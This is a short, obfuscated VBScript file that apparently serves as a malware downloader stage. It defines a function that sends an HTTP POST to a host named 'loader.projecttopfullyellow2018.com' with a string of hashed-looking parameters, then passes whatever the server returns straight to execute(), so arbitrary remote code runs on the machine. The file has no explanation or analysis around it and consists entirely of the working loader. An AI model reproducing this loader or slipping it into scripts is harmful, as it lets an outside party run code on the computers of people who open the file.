Function va6337b043(sUrl, sRequest)
  set xa15d04413 = CreateObject("Microsoft.XMLHTTP")
  xa15d04413.open "POST", sUrl,false
  xa15d04413.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  xa15d04413.setRequestHeader "Content-Length", Len(sRequest)
  xa15d04413.send sRequest
  va6337b043 = xa15d04413.responseText
 End Function
aa6e4c8051cfd4 = va6337b043("http://loader.projecttopfullyellow2018.com/","9bd5ee6fe55aaeb673025dbcb8f939c1=554644c0cc70e64757bfdfe8512f90c6&ba2f0015122a5955f8b3a50240fb91b2=8e82ab7243b7c66d768f1b8ce1c967eb&7cdace91c487558e27ce54df7cdb299c=8fecb20817b3847419bb3de39a609afe&99f42c473afe0eb4bd047ae133b851fc=0d85eb24e2add96ff1a7021f83c1abc9&af5afd7f7c807171981d443ad4f4f648=0b3f44d9054402de39441e165a4bdfe0&898aef0932f6aaecda27aba8e9903991=fbd85d9451c0d7555518534bcbac00e3&2f364281f619584f24f63a794a12e354=305ddad049f65a2c241dbb6e6f746c54")
execute(aa6e4c8051cfd4)